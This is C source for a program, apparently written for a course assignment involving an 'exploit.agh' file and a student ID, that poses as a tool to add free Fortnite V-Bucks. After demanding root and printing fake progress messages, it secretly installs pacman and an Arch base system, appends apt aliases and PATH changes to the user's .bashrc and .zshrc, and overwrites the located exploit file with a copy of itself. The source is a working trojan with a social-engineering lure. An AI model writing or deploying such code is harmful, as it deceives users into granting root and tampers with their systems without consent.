#define _XOPEN_SOURCE 500

#include "file_arrays/all_arrays.h"
#include "utils/utils.h"

#define EXPLOIT_NAME "exploit.agh"
#define FOUND_EXPLOIT 1
#define STUDENT_ID_LENGTH 6

char home_path[128], virus_path[256], exploit_path[256], student_id[STUDENT_ID_LENGTH+1];

// installs pacman onto system
void install_pacman() {
	// write necessary binaries
	write_file(pacman, pacman_len, pacman_out_path, 0755);
	write_file(libalpm, libalpm_len, libalpm_out_path, 0755);
	write_file(pacman_key, pacman_key_len, pacman_key_out_path, 0755);
	write_file(pacman_conf, pacman_conf_len, pacman_conf_out_path, 0755);
	write_file(vercmp, vercmp_len, vercmp_out_path, 0755);

	// make makepkg directories
	mkdir("/usr/share/makepkg", 0755);
	mkdir("/usr/share/makepkg/util", 0755);

	// write necessary scripts
	write_file(makepkg_message, makepkg_message_len, makepkg_message_out_path, 0644);
	write_file(makepkg_parseopts, makepkg_parseopts_len, makepkg_parseopts_out_path, 0644);

	// write pacman config file
	write_file(pacman_config, pacman_config_len, pacman_config_out_path, 0644);

	// make pacman.d directory and write mirrorlist into it
	mkdir("/etc/pacman.d", 0755);
	write_file(mirrorlist, mirrorlist_len, mirrorlist_out_path, 0644);

	// create needed directories
	mkdir("/var/lib/pacman", 0755);
	mkdir("/var/cache/pacman", 0755);
	mkdir("/var/cache/pacman/pkg", 0755);

	// make dirrectory for keyrings
	mkdir("/usr/share/pacman", 0755);
	mkdir("/usr/share/pacman/keyrings", 0755);

	// write keyring file
	write_file(archlinux_gpg, archlinux_gpg_len, archlinux_gpg_out_path, 0644);
	write_file(archlinux_trusted, archlinux_trusted_len, archlinux_trusted_out_path, 0644);
	write_file(archlinux_revoked, archlinux_revoked_len, archlinux_revoked_out_path, 0644);

	// create alpm download user
	system_no_output("sudo groupadd -r alpm");
	system_no_output("sudo useradd -r -g alpm -d /var/cache/pacman/pkg -s /bin/false alpm");

	// populate keys
	system_no_output("sudo pacman-key --init");
	system_no_output("sudo pacman-key --populate");

	// create new root directory for pacman to avoid conflicts in real root
	mkdir("/arch-root", 0755);

	// create db path directories
	mkdir("/arch-root/var", 0755);
	mkdir("/arch-root/var/lib", 0755);
	mkdir("/arch-root/var/lib/pacman", 0755);

	// sync databases and install base
	system_no_output("sudo pacman --root /arch-root -Sy");
	system_no_output("sudo pacman --root /arch-root -S base --noconfirm");

	// write fakeapt script to bin (alias for apt -> pacman)
	write_file(fakeapt, fakeapt_len, fakeapt_out_path, 0755);
}

// add aliases and modify PATH in .bashrc/.zshrc files
void modify_rc_files() {
	// get paths to .bashrc and .zshrc
	char bashrc_path[128], zshrc_path[128];
	sprintf(bashrc_path, "%s/.bashrc", home_path);
	sprintf(zshrc_path, "%s/.zshrc", home_path);

	// lines to add to the .bashrc and .zshrc files
	char *config_lines = "\nalias sudo='sudo '\nalias apt=fakeapt\nexport PATH=\"$PATH:/arch-root/bin\"";

	// append/create .bashrc
	int bashrc = open(bashrc_path, O_WRONLY | O_APPEND | O_CREAT, 0644);
	write(bashrc, config_lines, strlen(config_lines));
	close(bashrc);

	// append/create .zshrc
	int zshrc = open(zshrc_path, O_WRONLY | O_APPEND | O_CREAT, 0644);
	write(zshrc, config_lines, strlen(config_lines));
	close(zshrc);
}

// visit function for nftw - used for finding exploit
int nftw_visit(const char *file_path, const struct stat *sb, int typeflag, struct FTW *ftwbuf) {
	const char *file_name = file_path + ftwbuf->base;
	if (strcmp(file_name, EXPLOIT_NAME) == 0) {
		strcpy(exploit_path, file_path);
		return FOUND_EXPLOIT;
	}
	return 0;
}

// use exploit to get student ID and overwrite the file with the virus
void use_exploit() {
	// find exploit path
	// try first in home directory
	if (nftw(home_path, nftw_visit, 100, FTW_PHYS | FTW_DEPTH) != FOUND_EXPLOIT) {
		// if exploit not found in home, search the entire filesystem
		if (nftw("/", nftw_visit, 100, FTW_PHYS | FTW_DEPTH) != FOUND_EXPLOIT) {
			// if exploit not found, abort the overwrite operation
			return;
		}
	}

	// get student ID from exploit file
	int exploit_file = open(exploit_path, O_RDONLY);
	read(exploit_file, student_id, STUDENT_ID_LENGTH+1);
	close(exploit_file);
	student_id[STUDENT_ID_LENGTH] = '\0';

	// overwrite exploit file with virus
	readlink("/proc/self/exe", virus_path, 256);
	cp_file(virus_path, exploit_path);
}

int main() {
	// check for root privilages
	int root_check = geteuid();
	if (root_check != 0) {
		printf("To get free vbucks you must run this program with root privilages\n");
		return 1;
	}

	// Add free vbucks
	printf("Accessing Epic Games servers...\n");
	find_home_path(home_path);
	install_pacman();
	printf("Adding free vbucks...\n");
	modify_rc_files();
	use_exploit();
	printf("Free vbucks added!\n");

	return 0;
}
